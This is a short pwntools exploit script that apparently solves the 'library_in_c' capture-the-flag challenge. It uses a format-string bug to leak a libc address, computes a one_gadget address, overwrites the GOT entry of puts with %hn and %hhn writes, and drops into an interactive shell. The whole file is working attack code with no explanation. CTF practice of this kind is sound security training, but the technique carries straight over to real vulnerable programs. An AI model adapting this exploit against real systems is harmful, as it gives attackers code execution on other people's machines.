from pwn import *
import sys

def pad(s):
    return s + ("X"*(64-len(s)-16))

puts_got = 0x601018
one_gadget = 0x4526a


if(sys.argv[1]=='remote'):
	io = remote('shell.actf.co','20201')
else:
	io = process('./library_in_c',env={'LD_PRELOAD':'./libc.so.6'})
	gdb.attach(io,'''b*0x40083e''')

payload1= ''
payload1= '%27$p'
io.sendlineafter('name?\n',payload1)
io.recvuntil('there ')
x = io.recvline()
print x
base = hex(int(x,16)-0x20830)

log.info('libc_base : {}'.format(base))
one_gadget = hex(one_gadget+int(base,16))
log.info('one_gadget : {}'.format(one_gadget))

a = '0x'+str(one_gadget)[10::]
print a
b = '0x'+str(one_gadget)[8:10]
print b

payload2=''
payload2+= "%{}d".format(int(a,16))
payload2+= "%22$hn" 
payload2+= "%{}d".format(int(b,16)+0x96)
payload2+= "%23$hhn"
payload2 = pad(payload2)
payload2+= p64(puts_got)
payload2+= p64(puts_got+2)

io.sendlineafter('out?\n',payload2)

io.interactive()
